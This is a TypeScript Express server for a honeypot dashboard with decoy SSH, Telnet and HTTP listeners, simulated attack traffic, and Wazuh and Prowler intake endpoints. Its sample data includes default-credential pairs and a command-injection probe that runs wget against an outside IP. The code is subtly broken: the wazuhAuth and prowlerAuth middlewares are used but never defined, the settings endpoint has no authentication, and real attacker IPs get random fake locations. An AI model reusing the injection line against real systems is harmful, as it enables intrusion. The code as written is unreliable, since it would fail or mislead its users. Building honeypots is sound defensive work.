import express from 'express';
import path from 'path';
import fs from 'fs';
import net from 'net';
import http from 'http';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';
import { AttackEvent, SystemSettings } from './src/types';

dotenv.config();

const app = express();
const PORT = Number(process.env.PORT) || 3000;
const DB_FILE = './honeypot_db.json';

app.use(express.json());
function requireBearerToken(expectedToken: string) {
  return (req: express.Request, res: express.Response, next: express.NextFunction) => {
    const authorization = req.headers.authorization;

    if (!expectedToken || authorization !== `Bearer ${expectedToken}`) {
      return res.status(401).json({ error: 'Unauthorized' });
    }

    next();
  };
}

// --- Pre-calculated Mock Geolocation database for realism & performance ---
const LOCATIONS = [
  { country: 'United States', city: 'Ashburn', lat: 39.0437, lng: -77.4875 },
  { country: 'Germany', city: 'Frankfurt', lat: 50.1109, lng: 8.6821 },
  { country: 'China', city: 'Beijing', lat: 39.9042, lng: 116.4074 },
  { country: 'Brazil', city: 'São Paulo', lat: -23.5505, lng: -46.6333 },
  { country: 'Russia', city: 'Moscow', lat: 55.7558, lng: 37.6173 },
  { country: 'Netherlands', city: 'Amsterdam', lat: 52.3676, lng: 4.9041 },
  { country: 'Singapore', city: 'Singapore', lat: 1.3521, lng: 103.8198 },
  { country: 'South Korea', city: 'Seoul', lat: 37.5665, lng: 126.9780 },
  { country: 'United Kingdom', city: 'London', lat: 51.5074, lng: -0.1278 },
  { country: 'India', city: 'Bengaluru', lat: 12.9716, lng: 77.5946 },
  { country: 'Japan', city: 'Tokyo', lat: 35.6762, lng: 139.6503 },
  { country: 'Australia', city: 'Sydney', lat: -33.8688, lng: 151.2093 },
  { country: 'France', city: 'Paris', lat: 48.8566, lng: 2.3522 },
  { country: 'Canada', city: 'Toronto', lat: 43.6532, lng: -79.3832 },
  { country: 'South Africa', city: 'Cape Town', lat: -33.9249, lng: 18.4241 },
  { country: 'Sweden', city: 'Stockholm', lat: 59.3293, lng: 18.0686 },
  { country: 'Poland', city: 'Warsaw', lat: 52.2297, lng: 21.0122 }
];

const SCANNER_IPS = [
  '185.156.177.40', '193.32.248.112', '45.143.203.22', '85.209.11.89',
  '198.51.100.41', '203.0.113.125', '141.98.81.33', '103.116.14.90',
  '77.247.110.155', '61.177.173.14', '91.240.118.210', '185.65.135.5'
];

const CREDENTIALS = {
  SSH: [
    'root / admin', 'admin / 12345', 'support / support', 'pi / raspberry',
    'ubnt / ubnt', 'user / password', 'root / 123456', 'admin / admin'
  ],
  TELNET: [
    'admin / admin', 'root / root', 'guest / guest', 'tele / tele',
    'admin / 1234', 'root / password', 'support / password'
  ],
  HTTP: [
    'GET /.env', 'GET /wp-admin/index.php', 'POST /xmlrpc.php',
    'GET /shell?cd+/tmp;wget+http://91.13.91.5', 'GET /cgi-bin/main.cgi',
    'GET /phpmyadmin/', 'GET /actuator/gateway/routes', 'GET /robots.txt'
  ]
};

// State Store
let events: AttackEvent[] = [];
let settings: SystemSettings = {
  simulationSpeed: 'normal',
  alertThreshold: 10,
  decoyProfile: 'standard'
};

// SSE active channels
let sseClients: any[] = [];

// Load state or seed default coordinates to look gorgeous
function loadDatabase() {
  try {
    if (fs.existsSync(DB_FILE)) {
      const data = fs.readFileSync(DB_FILE, 'utf-8');
      events = JSON.parse(data);
      console.log(`Database loaded with ${events.length} logs.`);
    } else {
      seedDatabase();
    }
  } catch (error) {
    console.error('Failed to load database. Seeding fresh data...', error);
    seedDatabase();
  }
}

function saveDatabase() {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(events, null, 2), 'utf-8');
  } catch (err) {
    console.error('Failed to write database file:', err);
  }
}

function seedDatabase() {
  events = [];
  const now = new Date();
  
  // Seed about 80 points scattered across the last 24 hours
  for (let i = 0; i < 80; i++) {
    const hoursAgo = Math.floor(Math.random() * 24);
    const time = new Date(now.getTime() - hoursAgo * 60 * 60 * 1000 - Math.random() * 60 * 60 * 1000);
    const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
    const ip = SCANNER_IPS[Math.floor(Math.random() * SCANNER_IPS.length)];
    const protoChoices: Array<'SSH' | 'TELNET' | 'HTTP'> = ['SSH', 'TELNET', 'HTTP'];
    const protocol = protoChoices[Math.floor(Math.random() * protoChoices.length)];
    
    let port = 2222;
    if (protocol === 'TELNET') port = 2323;
    if (protocol === 'HTTP') port = 8080;

    const payloadList = CREDENTIALS[protocol];
    const payload = payloadList[Math.floor(Math.random() * payloadList.length)];

    events.push({
      id: `seed-${Date.now()}-${i}-${Math.random().toString(36).substr(2, 5)}`,
      timestamp: time.toISOString(),
      ip,
      port,
      protocol,
      payload,
      country: loc.country,
      city: loc.city,
      lat: loc.lat,
      lng: loc.lng
    });
  }

  events.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
  saveDatabase();
  console.log('Seeded database with historical honeypot records.');
}

loadDatabase();

// Adding an Incident and broadcasting
function insertEvent(eventData: Omit<AttackEvent, 'id' | 'timestamp'>) {
  const newEvent: AttackEvent = {
    ...eventData,
    id: `evt-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
    timestamp: new Date().toISOString()
  };

  events.unshift(newEvent);
  // Cap at 1000 events to manage filesystem easily
  if (events.length > 1000) {
    events = events.slice(0, 1000);
  }

  saveDatabase();

  // Send SSE push
  sseClients.forEach(client => {
    client.res.write(`data: ${JSON.stringify(newEvent)}\n\n`);
  });

  return newEvent;
}

// --- Active Simulated Security Traffic Generator ---
let generatorTimer: NodeJS.Timeout | null = null;

function resetGenerator() {
  if (generatorTimer) clearInterval(generatorTimer);
  if (settings.simulationSpeed === 'off') return;

  let delay = 6000; // standard
  if (settings.simulationSpeed === 'slow') delay = 12000;
  if (settings.simulationSpeed === 'fast') delay = 2500;

  generatorTimer = setInterval(() => {
    const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
    // Randomize the IP octets a bit for distinct indicators
    const ipBase = SCANNER_IPS[Math.floor(Math.random() * SCANNER_IPS.length)];
    const ipParts = ipBase.split('.');
    ipParts[3] = Math.floor(Math.random() * 254 + 1).toString();
    const ip = ipParts.join('.');

    const protocols: Array<'SSH' | 'TELNET' | 'HTTP'> = ['SSH', 'TELNET', 'HTTP'];
    const protocol = protocols[Math.floor(Math.random() * protocols.length)];
    
    let port = 2222;
    if (protocol === 'TELNET') port = 2323;
    if (protocol === 'HTTP') port = 8080;

    const payloadList = CREDENTIALS[protocol];
    const payload = payloadList[Math.floor(Math.random() * payloadList.length)];

    insertEvent({
      ip,
      port,
      protocol,
      payload,
      country: loc.country,
      city: loc.city,
      lat: loc.lat,
      lng: loc.lng
    });
  }, delay);
}

// Start simulation engine
resetGenerator();

// --- Real TCP & HTTP Honeypot Socket Pools ---
// Wrap each listener in try-catch blocks and add 'error' events to prevent any platform port collisions from halting app initialization.
try {
  const sshServer = net.createServer((socket) => {
    const clientIP = socket.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
    
    // Write fake OpenSSH greeting banner
    socket.write('SSH-2.0-OpenSSH_8.4p1 Ubuntu-5ubuntu1.4\r\n');
    
    socket.on('data', (data) => {
      const payloadStr = data.toString('utf-8', 0, 200).trim().replace(/[\r\n]+/g, ' ');
      // Resolve geo and write to DB
      const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
      insertEvent({
        ip: clientIP,
        port: 2222,
        protocol: 'SSH',
        payload: payloadStr || 'SSH handshake initiated',
        country: loc.country,
        city: loc.city,
        lat: loc.lat,
        lng: loc.lng
      });
      socket.end();
    });

    socket.on('error', () => {});
  });

  sshServer.on('error', (err: any) => {
    console.warn(`Decoy SSH Port 2222 error (${err.message}). Running in decoupled simulation mode.`);
  });

  sshServer.listen(2222, '0.0.0.0', () => {
    console.log('Decoy SSH Honeypot running internally on port 2222');
  });
} catch (e) {
  console.log('Decoy SSH Port 2222 was already bound or unavailable. Running in decoupled simulation mode.', e);
}

try {
  const telnetServer = net.createServer((socket) => {
    const clientIP = socket.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
    socket.write('Ubuntu 22.04.2 LTS\r\nlogin: ');

    let usernameCollected = false;
    let username = '';

    socket.on('data', (data) => {
      const input = data.toString('utf-8').trim();
      if (!usernameCollected) {
        username = input;
        usernameCollected = true;
        socket.write('Password: ');
      } else {
        const password = input;
        socket.write('Login incorrect\r\n');
        
        const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
        insertEvent({
          ip: clientIP,
          port: 2323,
          protocol: 'TELNET',
          payload: `Attempt credentials: ${username} / ${password}`,
          country: loc.country,
          city: loc.city,
          lat: loc.lat,
          lng: loc.lng
        });
        socket.end();
      }
    });

    socket.on('error', () => {});
  });

  telnetServer.on('error', (err: any) => {
    console.warn(`Decoy Telnet Port 2323 error (${err.message}). Running in decoupled simulation mode.`);
  });

  telnetServer.listen(2323, '0.0.0.0', () => {
    console.log('Decoy Telnet Honeypot running internally on port 2323');
  });
} catch (e) {
  console.log('Decoy Telnet Port 2323 was already bound or unavailable. Running in decoupled simulation mode.', e);
}

try {
  const httpDecoy = http.createServer((req, res) => {
    const clientIP = req.socket.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
    const reqMethod = req.method || 'GET';
    const reqPath = req.url || '/';
    const userAgent = req.headers['user-agent'] || 'Unknown';

    const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
    insertEvent({
      ip: clientIP,
      port: 8080,
      protocol: 'HTTP',
      payload: `${reqMethod} ${reqPath} - UA: ${userAgent.slice(0, 80)}`,
      country: loc.country,
      city: loc.city,
      lat: loc.lat,
      lng: loc.lng
    });

    res.writeHead(401, {
      'Content-Type': 'text/html',
      'WWW-Authenticate': 'Basic realm="Decoy Admin Workspace Management Console"',
      'Server': 'Apache/2.4.41 (Ubuntu)'
    });
    res.end('<h1>401 Unauthorized</h1><p>Restricted endpoint. Admin credentials needed.</p>');
  });

  httpDecoy.on('error', (err: any) => {
    console.warn(`Decoy HTTP Port 8080 error (${err.message}). Running in decoupled simulation mode.`);
  });

  httpDecoy.listen(8080, '0.0.0.0', () => {
    console.log('Decoy HTTP Admin Panel running internally on port 8080');
  });
} catch (e) {
  console.log('Decoy HTTP Port 8080 was already bound or unavailable. Running in decoupled simulation mode.', e);
}


// --- REST API ENDPOINTS ---

// Server-Sent Events stream for high-performance dashboard real-time syncing
app.get('/api/live', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });

  res.write('\n');

  const clientId = Date.now();
  const newClient = { id: clientId, res };
  sseClients.push(newClient);

  req.on('close', () => {
    sseClients = sseClients.filter(c => c.id !== clientId);
  });
});

// GET /api/events - Paginated list of security actions
app.get('/api/events', (req, res) => {
  const page = parseInt(req.query.page as string) || 1;
  const perPage = parseInt(req.query.perPage as string) || 30;
  const filterProtocol = req.query.protocol as string;

  let filtered = [...events];
  if (filterProtocol) {
    filtered = filtered.filter(e => e.protocol === filterProtocol);
  }

  const total = filtered.length;
  const totalPages = Math.ceil(total / perPage);
  const startIndex = (page - 1) * perPage;
  const paginatedList = filtered.slice(startIndex, startIndex + perPage);

  res.json({
    events: paginatedList,
    total,
    pages: totalPages,
    current_page: page
  });
});

// GET /api/stats - Aggregated security metrics & charts
app.get('/api/stats', (req, res) => {
  const total_attacks = events.length;

  // Unique IPs
  const uniqueIPsSet = new Set(events.map(e => e.ip));
  const unique_ips = uniqueIPsSet.size;

  // Top Targeted Port
  const portsCount: Record<number, number> = {};
  events.forEach(e => {
    portsCount[e.port] = (portsCount[e.port] || 0) + 1;
  });
  let top_port = 'N/A';
  let maxPortCount = 0;
  Object.entries(portsCount).forEach(([port, count]) => {
    if (count > maxPortCount) {
      maxPortCount = count;
      top_port = port;
    }
  });

  // Protocol distribution
  const protocol_stats: Record<string, number> = { SSH: 0, TELNET: 0, HTTP: 0 };
  events.forEach(e => {
    if (protocol_stats[e.protocol] !== undefined) {
      protocol_stats[e.protocol] += 1;
    }
  });

  // Top Attackers List
  const attackerMap: Record<string, { count: number; country: string }> = {};
  events.forEach(e => {
    if (!attackerMap[e.ip]) {
      attackerMap[e.ip] = { count: 0, country: e.country };
    }
    attackerMap[e.ip].count += 1;
  });
  const top_attackers = Object.entries(attackerMap)
    .map(([ip, details]) => ({ ip, country: details.country, count: details.count }))
    .sort((a, b) => b.count - a.count)
    .slice(0, 10);

  // Top Payloads/Credentials tried
  const payloadMap: Record<string, number> = {};
  events.forEach(e => {
    if (e.payload) {
      payloadMap[e.payload] = (payloadMap[e.payload] || 0) + 1;
    }
  });
  const top_payloads = Object.entries(payloadMap)
    .map(([payload, count]) => ({ payload, count }))
    .sort((a, b) => b.count - a.count)
    .slice(0, 10);

  res.json({
    total_attacks,
    unique_ips,
    top_port,
    protocol_stats,
    top_attackers,
    top_payloads
  });
});

// GET /api/threats - Group attackers by traffic and assign Threat levels
app.get('/api/threats', (req, res) => {
  const attackerMap: Record<string, { count: number; country: string; lastSeen: string }> = {};
  events.forEach(e => {
    if (!attackerMap[e.ip]) {
      attackerMap[e.ip] = { count: 0, country: e.country, lastSeen: e.timestamp };
    } else {
      attackerMap[e.ip].count += 1;
      if (new Date(e.timestamp).getTime() > new Date(attackerMap[e.ip].lastSeen).getTime()) {
        attackerMap[e.ip].lastSeen = e.timestamp;
      }
    }
  });

  const threats = Object.entries(attackerMap).map(([ip, details]) => {
    let level: 'LOW' | 'MEDIUM' | 'HIGH' = 'LOW';
    if (details.count >= settings.alertThreshold) {
      level = 'HIGH';
    } else if (details.count > 4) {
      level = 'MEDIUM';
    }

    return {
      ip,
      count: details.count,
      country: details.country,
      level,
      lastSeen: details.lastSeen
    };
  }).sort((a, b) => b.count - a.count);

  res.json(threats);
});

// POST /api/simulate - Trigger a client-side simulated direct port hit
app.post('/api/simulate', (req, res) => {
  const { protocol, host, payload } = req.body;
  
  const selectedProto = (protocol || 'SSH').toUpperCase() as 'SSH' | 'TELNET' | 'HTTP';
  let port = 2222;
  if (selectedProto === 'TELNET') port = 2323;
  if (selectedProto === 'HTTP') port = 8080;

  const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
  const randomizedSuffix = Math.floor(Math.random() * 254 + 1).toString();
  const sourceIP = host || `198.51.100.${randomizedSuffix}`;

  const defaultPayloads = CREDENTIALS[selectedProto];
  const selectedPayload = payload || defaultPayloads[Math.floor(Math.random() * defaultPayloads.length)];

  const logged = insertEvent({
    ip: sourceIP,
    port,
    protocol: selectedProto,
    payload: selectedPayload,
    country: loc.country,
    city: loc.city,
    lat: loc.lat,
    lng: loc.lng
  });

  res.json({
    status: 'success',
    event: logged
  });
});

// POST /api/wazuh/webhook - Ingest Wazuh alerts
app.post('/api/wazuh/webhook', wazuhAuth, (req, res) => {
  const alert = req.body;
  // A typical Wazuh alert has `rule`, `agent`, `location`, `data`
  
  const ruleId = alert.rule?.id || 'Unknown';
  const description = alert.rule?.description || 'Unknown Alert';
  const ip = alert.data?.srcip || alert.srcip || alert.agent?.ip || 'Unknown IP';
  
  // Try to grab geolocation if Wazuh GeoIP is configured
  const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];

  const logged = insertEvent({
    ip,
    port: 22,
    protocol: 'SSH', // Mocked as SSH for brute force context
    payload: `[Rule ${ruleId}] ${description}`,
    country: alert.data?.srcgeoip?.country_name || loc.country,
    city: alert.data?.srcgeoip?.city_name || loc.city,
    lat: alert.data?.srcgeoip?.location?.lat || loc.lat,
    lng: alert.data?.srcgeoip?.location?.lon || loc.lng
  });

  res.json({
    status: 'success',
    event: logged
  });
});

// POST /api/prowler/upload - Ingest Prowler JSON output
app.post('/api/prowler/upload', prowlerAuth, (req, res) => {
  const prowlerData = req.body;
  
  if (!Array.isArray(prowlerData)) {
    return res.status(400).json({ error: 'Expected an array of Prowler JSON results' });
  }

  // Handle both standard Prowler V3 format and newer JSON-OCSF formats
  const nsgChecks = prowlerData.filter((check: any) => 
    (check.ServiceName === 'virtualnetwork' && check.ResourceType === 'networksecuritygroups') || // Standard V3 format
    (check.cloud?.service?.name?.toLowerCase() === 'virtualnetwork' && check.cloud?.resource?.type === 'networksecuritygroups') || // Some newer formats
    check.CheckID?.toLowerCase().includes('networksecuritygroup') ||
    (check.resource && check.resource.type === 'Network Security Group')
  );
  
  // Status extraction depends on the specific JSON output format used (V3 vs OCSF)
  let fails = 0;
  let passes = 0;

  if (nsgChecks.length > 0) {
     fails = nsgChecks.filter((check: any) => check.Status === 'FAIL' || check.status === 'Fail' || check.finding_info?.status === 'Fail').length;
     passes = nsgChecks.filter((check: any) => check.Status === 'PASS' || check.status === 'Pass' || check.finding_info?.status === 'Pass').length;
  } else {
     // If no specific NSG checks found, just sum overall passes/fails for the PoC
     fails = prowlerData.filter((check: any) => check.Status === 'FAIL' || check.status === 'Fail' || check.finding_info?.status === 'Fail' || check.status_id === 2).length;
     passes = prowlerData.filter((check: any) => check.Status === 'PASS' || check.status === 'Pass' || check.finding_info?.status === 'Pass' || check.status_id === 1).length;
  }

  res.json({
    status: 'success',
    metrics: {
      total_nsg_checks: nsgChecks.length > 0 ? nsgChecks.length : prowlerData.length,
      fails,
      passes
    }
  });
});

// GET /api/settings - Get settings
app.get('/api/settings', (req, res) => {
  res.json(settings);
});

// POST /api/settings - Configure active sandbox speeds and threshold parameters
app.post('/api/settings', (req, res) => {
  const { simulationSpeed, alertThreshold, decoyProfile } = req.body;
  if (simulationSpeed) settings.simulationSpeed = simulationSpeed;
  if (alertThreshold !== undefined) settings.alertThreshold = Number(alertThreshold);
  if (decoyProfile) settings.decoyProfile = decoyProfile;

  resetGenerator();
  res.json({
    status: 'success',
    settings
  });
});

// --- VITE INTERFACE INTEGRATION MIDDLEWARES ---
async function startWebPipeline() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(3000, '0.0.0.0', () => {
    console.log(`Honeypot Core Server listening on http://0.0.0.0:3000`);
  });
}

startWebPipeline();
